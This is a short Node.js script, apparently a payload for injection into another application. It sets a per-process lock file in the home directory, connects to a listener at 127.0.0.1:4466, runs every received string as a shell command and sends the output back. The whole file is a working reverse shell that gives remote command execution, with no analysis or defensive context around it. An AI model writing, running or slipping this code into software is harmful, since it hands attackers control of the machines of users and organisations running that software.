

var XXX123fs = require("fs")
var XXX123net = require("net")
var XXX123path = require("path")
var XXX123os = require("os")
var XXX123proc = require("process")


var XXX123pid = String(XXX123proc.pid)


if (!XXX123fs.existsSync(XXX123path.join(XXX123os.homedir(),`.${XXX123pid}.lock`))){

    //create lock file 
XXX123fs.writeFile(XXX123path.join(XXX123os.homedir(),`.${XXX123pid}.lock`),"", (err) => {
    if (err) {
      console.log(err)
    }
  });

    (function(){
        var client = new XXX123net.Socket();
        client.connect(4466, "127.0.0.1")

        let received = ""
        client.on("data", data => {
        received = data
        try{
            var XXX123exec  = require("child_process").exec;

            XXX123exec(`${received}`, (error, stdout, stderr) => {
            if (error) {
                client.write(stderr)
                return;
            }
            if (stderr) {
                client.write(stdout)
                return;
            }
            client.write(stdout)
        });

        }
        catch(ex){
            console.log(ex)
        }

        })
        client.on("close", () => {
        console.log("connection closed")
        })

        return /a/; // Prevents the Node.js application form crashing
    })();
}


 

//////